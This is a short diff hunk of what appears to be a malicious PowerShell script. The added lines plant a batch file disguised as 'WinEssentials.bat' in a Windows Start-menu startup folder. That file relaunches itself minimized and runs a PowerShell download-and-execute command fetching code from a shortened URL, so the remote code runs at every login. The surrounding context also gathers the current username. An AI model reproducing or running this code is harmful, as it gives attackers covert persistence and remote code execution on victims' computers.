@@ -20,6 +20,18 @@ exit
 powershell IEX (New-Object System.Net.WebClient).DownloadString('http://tinyurl.com/y44v5ltr')
 "@
 
+cd "C:\ProgramData\Microsoft\Windows\menuen start\Programs\Start" 
+
+New-Item -Path . -Name "WinEssentials.bat" -ItemType "file" -Value @"
+@echo off
+if "%1"=="done" goto runtime
+start "" /min %0 done
+exit
+
+:runtime
+powershell IEX (New-Object System.Net.WebClient).DownloadString('http://tinyurl.com/y44v5ltr')
+"@
+
 $ps = "";
 $id = Get-Random
 $username=( ( Get-WMIObject -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
